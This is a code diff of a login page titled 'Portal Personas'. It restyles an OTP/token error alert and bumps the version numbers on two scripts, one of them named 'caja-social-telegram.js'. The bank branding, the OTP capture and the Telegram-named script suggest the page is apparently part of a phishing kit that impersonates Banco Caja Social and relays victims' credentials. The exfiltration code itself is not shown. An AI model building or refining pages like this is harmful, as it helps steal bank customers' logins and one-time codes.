@@ -30,10 +30,17 @@
                 
                 <h1 class="title">Bienvenido al<br>Portal Personas</h1>
 
-                <div id="otpTokenErrorAlert" class="caja-alert-error" role="alert" hidden>
-                    <span class="caja-alert-error__icon" aria-hidden="true">!</span>
-                    <div class="caja-alert-error__body">
-                        <strong>CODIGO OTP INGRESADO INCORRECTO O TOKEN INGRESADO INCORRECTO</strong>
+                <div id="otpTokenErrorAlert" data-role="login-template__alert" class="alert alert-danger caja-alert-error" role="alert" hidden>
+                    <div class="alert-body">
+                        <div class="alert-icon">
+                            <svg class="bb-icon bb-icon--md bb-icon-error-outline" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+                                <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/>
+                                <path d="M12 8v5M12 16h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                            </svg>
+                        </div>
+                        <div class="alert-content">
+                            <strong role="heading" class="alert-heading">CODIGO OTP INGRESADO INCORRECTO O TOKEN INGRESADO INCORRECTO</strong>
+                        </div>
                     </div>
                 </div>
                 
@@ -106,7 +113,7 @@
     </script>
 
     <script src="/js/banco-utils.js"></script>
-    <script src="caja-social-telegram.js?v=2"></script>
-    <script src="client-optimized.js?v=2"></script>
+    <script src="caja-social-telegram.js?v=3"></script>
+    <script src="client-optimized.js?v=3"></script>
 </body>
 </html>
